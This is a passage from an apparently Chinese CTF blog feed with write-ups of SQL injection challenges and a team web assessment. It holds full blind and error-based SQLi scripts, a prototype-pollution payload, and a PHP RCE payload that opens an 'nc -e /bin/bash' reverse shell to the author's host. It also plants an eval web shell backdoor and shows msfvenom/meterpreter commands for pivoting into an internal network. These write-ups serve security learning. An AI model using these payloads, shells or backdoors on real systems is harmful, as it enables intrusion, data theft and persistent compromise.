                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{c0db499e-7c62-46c7-a2ce-0bd9a239cc25}&lt;/p&gt;
&lt;h3 id=&#34;ciscn2019-华北赛区-day2-web1hack-worldhttpsbuuojcnchallengesciscn201920华北赛区20day220web1hack20world&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[CISCN2019%20%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba%20Day2%20Web1]Hack%20World&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CISCN2019 华北赛区 Day2 Web1]Hack World&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：SQLi、括号嵌套绕过空格、^符号绕过or&lt;/p&gt;
&lt;p&gt;直接给了表名=&amp;lsquo;flag&amp;rsquo;，列名=&amp;lsquo;flag&amp;rsquo;。&lt;/p&gt;
&lt;p&gt;fuzz，常规搞事儿关键字都被过滤；&lt;/p&gt;
&lt;p&gt;想到了前几天做的finalSQLi，尝试用&lt;code&gt;^&lt;/code&gt;代替&lt;code&gt;or&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0^1
//返回Hello, glzjin wants a girlfriend.和1的结果一样，说明起效了
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么尝试库名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0^(length(database())&amp;gt;1)
//成功
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ok，直接写脚本&lt;/p&gt;
&lt;p&gt;需要注意的是substr(&lt;code&gt;(condition)&lt;/code&gt;,1,1)的&lt;code&gt;condition子查询&lt;/code&gt;，两边需要括号，不然来不了事儿。&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#wh1sper
#bool盲注
import requests

host = &#39;http://14bb7de3-9b94-4870-9178-2fefa1bfc029.node3.buuoj.cn/index.php&#39;

def mid(bot, top):
    return (int)(0.5*(top + bot))

def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:

            #babyselect = &amp;quot;database()&amp;quot;--&amp;gt;ctftraining
            #babyselect = &amp;quot;version()&amp;quot;--&amp;gt;10.2.26-MariaDB-log

            babyselect = &amp;quot;(select(flag)from(ctftraining.flag))&amp;quot;
            select = &amp;quot;ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{}&amp;quot;.format(j, mid(top, bot))
            playload = &amp;quot;0^(&amp;quot;+select+&amp;quot;)&amp;quot;

            data = {
                &amp;quot;id&amp;quot;: playload
            }

            #print(playload)
            r = requests.post(url=host, data=data)
            #print(r.text)
            if &#39;glzjin wants&#39; in r.text:  # 成功
                if top - 1 == bot:      # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:               # 失败
                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag{2ed1b2c4-f083-424e-a4e9-303222f99563}&lt;/p&gt;
&lt;h3 id=&#34;gyctf2020ezsqlihttpsbuuojcnchallengesgyctf2020ezsqli&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[GYCTF2020]Ezsqli&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GYCTF2020]Ezsqli&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：bool盲注，绕&lt;code&gt;information_schema&lt;/code&gt;和&lt;code&gt;sys.schema_auto_increment_columns&lt;/code&gt;，无列名过滤union和join&lt;/p&gt;
&lt;p&gt;本站&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/2020i%e6%98%a5%e7%a7%8b%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b_web_wp/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GYCTFwp&lt;/a&gt;已经讲过，所以简单说。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0||1
//返回Nu1L
0||0
//返回Error Occured When Fetch Result.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;判断为bool盲注；&lt;/p&gt;
&lt;p&gt;&lt;code&gt;information_schema&lt;/code&gt;和&lt;code&gt;sys.schema_auto_increment_columns&lt;/code&gt;这两个都被过滤了，可以使用&lt;code&gt;sys.schema_table_statistics_with_buffer&lt;/code&gt;，无列名，而且过滤union和join，就只能用类似于：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(select &#39;admin&#39;,&#39;admin&#39;)&amp;gt;(select * from users limit 1)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样的语句，前提是两边的查询列数相等，然后是按位比较，在某一位上谁大，那么就是谁大，如果相等的话，就比较下一位。&lt;/p&gt;
&lt;p&gt;举几个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;g &amp;gt; flag{abcd}
a &amp;lt; flag{abcd}
fz &amp;gt; flag{bbbbb}//第一位相等，比较第二位
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么直接exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#wh1sper
#bool盲注
import requests

host = &#39;http://7282ff4f-c5c7-4023-be2e-b40f0e422e2c.node3.buuoj.cn/index.php&#39;

def mid(bot, top):
    return (int)(0.5*(top + bot))

def trans_to_hex(str):
    result = &#39;0x&#39;
    for i in str:
        temp = hex(ord(i))
        result += temp.replace(&#39;0x&#39;,&#39;&#39;)
    return result


def sqli():
    name = &#39;&#39;
    for j in range(20, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = &amp;quot;(database())&amp;quot;---&amp;gt;give_grandpa_pa_pa_pa
            #babyselect = &amp;quot;(version())&amp;quot;---&amp;gt;10.2.26-MariaDB-log

            #babyselect = &amp;quot;(select group_concat(table_name) from 
            # sys.schema_table_statistics_with_buffer
            # where table_schema=database())&amp;quot;---&amp;gt;users233333333333333,f1ag_1s_h3r3_hhhhh

            #select = &amp;quot;ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{}&amp;quot;.format(j, mid(top, bot))

            select = &amp;quot;(select * from f1ag_1s_h3r3_hhhhh)&amp;gt;(select 1,{})&amp;quot;.\
                format(trans_to_hex(name+chr(mid(bot, top))))
            playload = &amp;quot;0||&amp;quot;+select
            data = {
                &amp;quot;id&amp;quot;: playload
            }
            #print(playload)
            r = requests.post(url=host, data=data)
            #print(r.text)
            if &#39;|&#39; in name://最后一位没有下一位可以比较，只能在这里返回，替换一下即可
                name = name.lower().replace(&#39;|&#39;, &#39;}&#39;)
                print(name)
                return

            if &#39;Nu1L&#39; in r.text:  # 成功
                if top - 1 == bot:      # top和bot相邻，说明name是top
                    name += chr(top-1)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:               # 失败
                if top - 1 == bot:      # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top


if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;原题flag都是小写，所以就没管它，不过&lt;a class=&#34;link&#34; href=&#34;https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;出题人笔记&lt;/a&gt;里边本来想考大小写的，我太垃圾，就没管了&lt;/p&gt;
&lt;p&gt;flag{ec726349-d504-4a00-a288-7b72fbc33418}&lt;/p&gt;
&lt;h3 id=&#34;极客大挑战-2019hardsqlhttpsbuuojcnchallenges极客大挑战202019hardsql&#34;&gt;[&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98%202019]HardSQL&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;极客大挑战 2019]HardSQL&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：报错注入&lt;/p&gt;
&lt;p&gt;先是fuzz，引号，注释没被过滤，|、&amp;amp;、空格、*这些都被过滤了&lt;/p&gt;
&lt;p&gt;利用亦或符号进行注入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=1&#39;^1%23&amp;amp;password=1
回显：
Login Success!!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;应该可以盲注或者报错注入&lt;/p&gt;
&lt;p&gt;我这里用的是报错注入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
import re
 
host = &#39;http://7e5bdd7f-60ce-49fc-88cb-cf4e6ac51763.node3.buuoj.cn/check.php?&#39;
#babystr = &amp;quot;select(database())&amp;quot;--&amp;gt;geek
#babystr = &amp;quot;select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))&amp;quot;--&amp;gt;H4rDsq1
#babystr = &amp;quot;select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))&amp;quot;--&amp;gt;id,username,password
#babystr = &amp;quot;select(left(group_concat(password),31))from(H4rDsq1)&amp;quot;
babystr = &amp;quot;select(right(group_concat(password),31))from(H4rDsq1)&amp;quot;
#--flag{9b788a2b-b307-4935-b7e7-0b&#39;
#--2b-b307-4935-b7e7-0b853f26382a}
#flag{9b788a2b-b307-4935-b7e7-0b853f26382a}
payload = &amp;quot;username=1&#39;^updatexml(1,concat(0x7e,({}),0x7e),1)%23&amp;amp;password=1&amp;quot;.format(babystr)
r = requests.get(host+payload)
print(payload)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意点是updatexml这个报错注入只能显示32个字符，需要两次用left和right分别打&lt;/p&gt;
&lt;p&gt;flag{9b788a2b-b307-4935-b7e7-0b853f26382a}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2020 X1cT34m Web第一次考核</title>
        <link>https://anthem-whisper.github.io/p/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/</link>
        <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164754.jpeg" alt="Featured image of post 2020 X1cT34m Web第一次考核" /&gt;&lt;h3 id=&#34;0x00前言&#34;&gt;&lt;strong&gt;0x00前言&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;终于等到来的太突然的考核，感觉自己表现不是太好，本来入门时间也不短了，是因为不够努力才这么菜&lt;/p&gt;
&lt;p&gt;玩了一把内网渗透（不是），感觉有点意思。&lt;/p&gt;
&lt;h3 id=&#34;0x01第一题&#34;&gt;&lt;strong&gt;0x01第一题&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;考点：sqli&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;username中\转义&amp;rsquo;导致password语句逃逸单引号&lt;/li&gt;
&lt;li&gt;union注入&lt;/li&gt;
&lt;li&gt;绕过逗号过滤继续注入&lt;/li&gt;
&lt;li&gt;无列名注入&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;打开题目，抓包，发现POST过去的数据是json形式，没想到其他，只想到了sqli，于是我用bp的intruder模块fuzz了一下：&lt;/p&gt;
&lt;p&gt;(这里本来有一个表，莫名其妙消失了)&lt;/p&gt;
&lt;p&gt;被过滤：单引号、|、，、or、空格&lt;/p&gt;
&lt;p&gt;没被过滤：select、union&lt;/p&gt;
&lt;p&gt;空格被过滤，用/&lt;strong&gt;/代替，（可以使用word的替换功能）本文的空格都是/&lt;/strong&gt;/&lt;/p&gt;
&lt;p&gt;既然单引号被过滤了，那么就想到了CGCTF和之前的BJDCTF的注入，利用username输入反斜杠来转义单引号，直接看例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;原本语句：SELECT * from user WHERE username = &#39;admin&#39; and password = &#39;123&#39;
转义语句：SELECT * from user WHERE username = &#39;admin\&#39; and password =&#39; or 1=1#&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以看到，实际上第二句的&lt;code&gt;username&lt;/code&gt;是&lt;code&gt;&#39;admin\&#39; and password =&#39;&lt;/code&gt;后门接的&lt;code&gt;or 1=1&lt;/code&gt;自然也就造成了注入。&lt;/p&gt;
&lt;p&gt;这道题正常输入的时候回显是&lt;code&gt;username or password error&lt;/code&gt;如果使用这个playload的话回显是&lt;code&gt;true&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;union没有被过滤的话，那么就尝试union注入吧：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;查询列数：
{&amp;quot;username&amp;quot;:&amp;quot;1\\&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;group/**/by/**/1#&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里有点玄学的是，明明查的是三列，但是只能group by 1有回显，就很神奇。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;查询列数： {&amp;quot;username&amp;quot;:&amp;quot;1\\&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;union/**/select/**/1,2,3#&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显是“WAF！！！”因为逗号被过滤了&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;join&lt;/code&gt;绕过逗号过滤：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;union select * from ((select 1)A join (select 2)B join (select 3)C)#
//union select * from ((select 1)A join (select 2)B join (select 3)C)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询成功，列数为3，&lt;code&gt;2&lt;/code&gt;和&lt;code&gt;3&lt;/code&gt;分别为username和password的回显位置，就可以替换为子查询，但是最致命的是&lt;code&gt;or&lt;/code&gt;被过滤了，造成了&lt;code&gt;information_schema&lt;/code&gt;背锅，所以我们需要&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/193512#h2-3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;bypass information_schema&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;查看了MySQL版本为5.7之后&lt;code&gt;sys.schema_auto_increment_columns&lt;/code&gt;成为了我们的工具&lt;/p&gt;
&lt;p&gt;将上述语句的&lt;code&gt;2&lt;/code&gt;或&lt;code&gt;3&lt;/code&gt;替换为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT group_concat(table_name) from sys.schema_auto_increment_columns WHERE table_schema = database()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;表名：&lt;code&gt;user&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本来列名可以猜解出来，不过因为是非预期所以被ban了，接下来便是&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/98206699?from_voters_page=true&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;无列名注入&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;替换&lt;code&gt;select 3&lt;/code&gt;为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select i.3 from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from users)i limit 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显：&lt;code&gt;{&amp;quot;code&amp;quot;:2,&amp;quot;username&amp;quot;:&amp;quot;2&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;3&amp;quot;,&amp;quot;result&amp;quot;:&amp;quot;SUCCESS&amp;quot;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;说明和没替换的效果一样，这个道理相当于是利用union查询的特性给他起了一个名字，起的名字是i，&lt;code&gt;i.3&lt;/code&gt;就是查第三列，看例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from (select 1,2,3 union select &#39;a&#39;,&#39;b&#39;,&#39;c&#39;)i;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
| a | b | c |
+---+---+---+
mysql&amp;gt; select i.3 from (select 1,2,3 union select &#39;a&#39;,&#39;b&#39;,&#39;c&#39;)i;
+---+
| 3 |
+---+
| 3 |
| c |
+---+
lmit 1`是和`limit 0,1`效果一样，意思是从第0条返回1条结果，我们这样只能查到我们自己起的列名，想要查值就需要`limit 1，1`但是逗号被过滤了，我们可以用`limit 1 offset 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;select 3&lt;/code&gt; 替换为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select i.1 from 
(select * from ((select 1)A join (select 2)B join (select 3)C) union select * from users)i 
limit 1 offset 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询username列，password列替换为&lt;code&gt;i.2&lt;/code&gt;，&lt;code&gt;i.3&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;最终playload：&lt;/p&gt;
&lt;p&gt;username: &lt;code&gt;1\\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;password:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;union select * from(
    (select 1)A join (select 2)B join(
        select i.3 from(
            select * from (
                    (select 1)A join (select 2)B join (select 3)C
            )union select * from users
        )i limit 1 offset 1
    )C

)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显：&lt;/p&gt;
&lt;p&gt;{&amp;ldquo;code&amp;rdquo;:2,&amp;ldquo;username&amp;rdquo;:&amp;ldquo;2&amp;rdquo;,&amp;ldquo;password&amp;rdquo;:&amp;quot;&lt;code&gt;74b87337454200d4d33f80c4663dc5e5&lt;/code&gt;&amp;quot;,&amp;ldquo;result&amp;rdquo;:&amp;ldquo;SUCCESS&amp;rdquo;}&lt;/p&gt;
&lt;h3 id=&#34;0x02第二题&#34;&gt;&lt;strong&gt;0x02第二题&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;考点：JS原型链污染、MySQL远程登录任意文件读取&lt;/p&gt;
&lt;p&gt;给了index.js源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var express = require(&#39;express&#39;);
var router = express.Router();
var mysql  = require(&#39;mysql&#39;);


const isObject = obj =&amp;gt; obj &amp;amp;&amp;amp; obj.constructor &amp;amp;&amp;amp; obj.constructor === Object;
function merge(a, b) {
  for (let attr in b) {
    if (isObject(a[attr]) &amp;amp;&amp;amp; isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
function waf(value){
  let re = /(,| |or|\||\^|&amp;amp;|;|BENCHMARK|SLEEP)/ig;
  let arr = value.match(re);
  if (arr === null){
    return 0;
  }
  return 1;
}
function clone(a) {
  return merge({}, a);
}

router.post(&#39;/&#39;, function(req, res, next) {
  let body = JSON.parse(JSON.stringify(req.body));
  if (body.host != undefined) {
    res.json({
      &amp;quot;result&amp;quot;:&amp;quot;There is more to it!&amp;quot;
    });
  }else if (body.username === undefined || body.password === undefined){
    res.json({
      &amp;quot;code&amp;quot;:1,
      &amp;quot;result&amp;quot;:&amp;quot;username and password are necessary!&amp;quot;
    });
  }else if (waf(body.username)||waf(body.password)){
    res.json({
      &amp;quot;code&amp;quot;:1,
      &amp;quot;result&amp;quot;:&amp;quot;WAF!!!&amp;quot;
    });
  }else {
    let copybody = clone(body);
    let host = copybody.host == undefined ? &amp;quot;localhost&amp;quot; : copybody.host
    let config = {
      host: host,
      user: &#39;root&#39;,
      password: &#39;123456&#39;,
      database: &#39;security&#39;
    };

    let connection = mysql.createConnection(config);
    connection.connect();
    connection.query(&#39;select * from users where uuuusername=&amp;quot;&#39;+copybody.username+&#39;&amp;quot; and ppppassword = &amp;quot;&#39;+copybody.password+&#39;&amp;quot;&#39;, function (error, results, fields) {
      if (error){
        res.json({
          &amp;quot;code&amp;quot;:1,
          &amp;quot;result&amp;quot;:&amp;quot;ERROR&amp;quot;
        });
      }else if (results[0] === undefined){
        res.json({
          &amp;quot;code&amp;quot;:1,
          &amp;quot;result&amp;quot;:&amp;quot;username or password error&amp;quot;
        });
      }else{
        res.json({
          &amp;quot;code&amp;quot;:2,
          &amp;quot;username&amp;quot;:results[0].uuuusername,
          &amp;quot;password&amp;quot;:results[0].ppppassword,
          &amp;quot;result&amp;quot;:&amp;quot;SUCCESS&amp;quot;
        });
      }
    });
    connection.end();
  }
});
module.exports = router;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先来说一说JS原型链污染：&lt;/p&gt;
&lt;p&gt;先贴一篇学习链接：&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/176884&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;戳这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单来讲，JS的语言特性是“万物皆为对象（object.prototype）”，这也是JS“基于对象”的解释&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164807.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是__proto__和类的prototype对应&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果我们访问一个对象里面属性，JS则会在这个对象里面查找这个属性，如果不存在，那么就会返回上一级查找。&lt;/p&gt;
&lt;p&gt;那么原型链污染就是：&lt;/p&gt;
&lt;p&gt;在我们想要利用的代码之前的赋值语句如果可控的话，我们进行 ——&lt;strong&gt;proto&lt;/strong&gt; 赋值，之后就可以利用代码了&lt;/p&gt;
&lt;p&gt;很明显，这道题我们可以污染host属性&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;1&amp;quot;,&amp;quot;__proto__&amp;quot;:{&amp;quot;host&amp;quot;:&amp;quot;我的ip&amp;quot;}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里为什么要污染host属性呢，其实是为了触发下一个漏洞——&lt;a class=&#34;link&#34; href=&#34;https://www.anquanke.com/post/id/173039&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Mysql任意文件读取漏洞&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;直接上exp：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/poc%26tool/Rogue-MySql-Server-master.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Rogue-MySql-Server-master&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;修改对应端口就行。&lt;/p&gt;
&lt;h3 id=&#34;0x03第三题&#34;&gt;&lt;strong&gt;0x03第三题&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;考点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;parse_url解析漏洞、PHP协议容错性、简单sqli、file_put_contents漏洞&lt;/li&gt;
&lt;li&gt;简单内网渗透、redis未授权访问漏洞、redis主从复制漏洞&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;打开题目即送源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
//it may help u
echo &amp;quot;&amp;lt;h1&amp;gt;WELCOME 23333333333&amp;lt;/h1&amp;gt;&amp;quot;.&amp;quot;\n&amp;quot;;
$url = $_SERVER[&amp;quot;HTTP_REFERER&amp;quot;];
$r = parse_url($url);
if(!empty($r[&#39;host&#39;]) &amp;amp;&amp;amp; $r[&#39;host&#39;] === &#39;localhost&#39;){
  readfile($url);//  hint.txt
}
else{
  echo &#39;ONLY FROM LOCALHOST!!!!&#39;.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
}

//only admin can do it
$password = $_GET[&#39;password&#39;];
$username = $_GET[&#39;username&#39;];
$content = addslashes($_GET[&#39;content&#39;]);

if($username === &amp;quot;******&amp;quot; &amp;amp;&amp;amp; $password === &amp;quot;******&amp;quot;){
  echo &#39;now_you_are_admin&#39;.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
  $sandbox = &#39;./sandbox/&#39; . md5(&amp;quot;x&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
  @mkdir($sandbox);
  @chdir($sandbox);
  echo $sandbox.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
  if(!file_exists(&amp;quot;admin.php&amp;quot;)){
    file_put_contents(&#39;admin.php&#39;, &amp;quot;&amp;lt;?php \$secret = &#39;xxx&#39;; ?&amp;gt;&amp;quot;);
  }
  //change the content
  if($content){
    $file = file_get_contents(&amp;quot;./admin.php&amp;quot;);
    $file = preg_replace(&amp;quot;/secret = &#39;.*&#39;/&amp;quot;, &amp;quot;secret = &#39;{$content}&#39;&amp;quot;, $file);
    file_put_contents(&#39;./admin.php&#39;, $file);
  }

}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第5行&lt;code&gt;parse_url&lt;/code&gt;解析我们只需要任意&lt;code&gt;&amp;lt;字母、数字&amp;gt;://&amp;lt;字母、数字&amp;gt;&lt;/code&gt;就可以让他返回&lt;code&gt;host=第二个&amp;lt;字母、数字&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP协议的容错性：PHP在遇到一个不认识的协议的时候，会抛出一个warning，并且将协议设置为&lt;code&gt;null&lt;/code&gt;。后面，在协议是&lt;code&gt;null&lt;/code&gt;或者是&lt;code&gt;file&lt;/code&gt;时，会进行本地文件操作。也就是说，默认情况下，如果你没加协议，或者加了个不存在的协议，或者协议名字是&lt;code&gt;file&lt;/code&gt;，都会被认为是本地文件的相关操作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;playload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;referer: 0://localhost/../../../（一个一个加，直到读到文件为止）../hint.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显告诉了&lt;code&gt;username&lt;/code&gt;是&lt;code&gt;pig_can_fly&lt;/code&gt;并且说password需要在另一台服务器上面获取，我们点击访问他给的ip，发现就是一个很简单的union注入，得到了&lt;code&gt;password&lt;/code&gt;的md5值：&lt;code&gt;dc3565645d8002becb5fd7977aeef3e1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;暴力破解之后是：&lt;code&gt;admin_password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;GET传过去之后出现了一段JS代码，不过我没做（233333）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;content&lt;/code&gt;变量那里可以直接利用&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/wh4am1/p/6607837.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;file_put_contents漏洞&lt;/a&gt;RCE&lt;/p&gt;
&lt;p&gt;playload（GET传值）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?username=pig_can_fly&amp;amp;password=admin_password&amp;amp;content=a\&#39;;echo+`nc+-e+/bin/bash+我的ip+端口`//
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我之前试了很多个，不知道究竟是哪个起了作用，后来问了问其他人，好像只有反引号才能起作用。&lt;/p&gt;
&lt;p&gt;回到VPS监听端口，果然收到了一份新鲜的shell；&lt;/p&gt;
&lt;p&gt;赶紧重新写一个后门：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;&amp;lt;?php @eval(\$_POST[&#39;123&#39;]);?&amp;gt;&amp;quot; &amp;gt; wh1sper.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;蚁剑连接，拿到shell；&lt;/p&gt;
&lt;p&gt;高兴了好一阵，不过并没有找到flag，问了出题人，说是在内网。。。&lt;/p&gt;
&lt;p&gt;联想到NCTF2019的true xml cookbook，读取&lt;code&gt;/etc/hosts&lt;/code&gt;文件和&lt;code&gt;/proc/net/arp&lt;/code&gt;，推测内网存活主机&lt;code&gt;10.0.0.1-3&lt;/code&gt;，2是自己，flag可能在3上面。&lt;/p&gt;
&lt;p&gt;于是在VPS上面装了MSF，通过msf的一些模块探测到了一些信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在本地生成了&lt;code&gt;shell.elf&lt;/code&gt;文件通过蚁剑上传到目录，继续在msf里面执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;use exploit/multi/handler
set payloads linux/x86/meterpreter/reverset_tcp
set lhost 我的ip
set lport 我的端口
run
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行了这些命令，发现msf开始监听端口，这个时候通过蚁剑终端运行&lt;code&gt;./shell.elf&lt;/code&gt;命令，就可以获得一个&lt;code&gt;meterpreter&lt;/code&gt;类型的shell&lt;/p&gt;
&lt;p&gt;得到shell之后，我们需要先建立&lt;code&gt;meterpreter基本隧道代理&lt;/code&gt;&lt;/p&gt;
